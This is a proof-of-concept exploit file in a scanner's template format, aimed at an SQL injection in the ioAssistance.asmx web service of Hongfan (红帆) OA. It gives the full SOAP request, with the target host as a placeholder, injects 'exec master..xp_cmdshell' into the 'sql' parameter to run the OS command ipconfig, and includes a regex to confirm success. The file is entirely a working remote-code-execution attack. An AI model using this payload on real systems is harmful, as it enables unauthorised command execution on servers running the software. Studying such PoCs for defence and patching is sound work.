Office Automation/红帆 OA ioAssistance.asmx 注入RCE.poc

<DudePoc_Name>红帆 OA ioAssistance.asmx 注入RCE</DudePoc_Name>
<DudePoc_Description>红帆 OA ioAssistance.asmx 注入RCE</DudePoc_Description>
<DudePoc_SetHeader>
POST /iOffice/prg/set/wss/ioAssistance.asmx HTTP/1.1
Host: $<AttackHost>$
Content-Length: 0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: text/xml
</DudePoc_SetHeader>
<DudePoc_SetData>
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:xsd="http://www.w3.org/2001/XMLSchema"
    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <GetLoginedEmpNoReadedInf
            xmlns="http://tempuri.org/">
            <sql>$<AttackCode>$</sql>
        </GetLoginedEmpNoReadedInf>
    </soap:Body>
</soap:Envelope>
</DudePoc_SetData>
<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
<DudePoc_VerifyData>^(?=.*?(?:Windows|IP)).*?$</DudePoc_VerifyData>
<DudePoc_VerifyFile></DudePoc_VerifyFile>
<DudePoc_AttackCode>exec master..xp_cmdshell "ipconfig"</DudePoc_AttackCode>
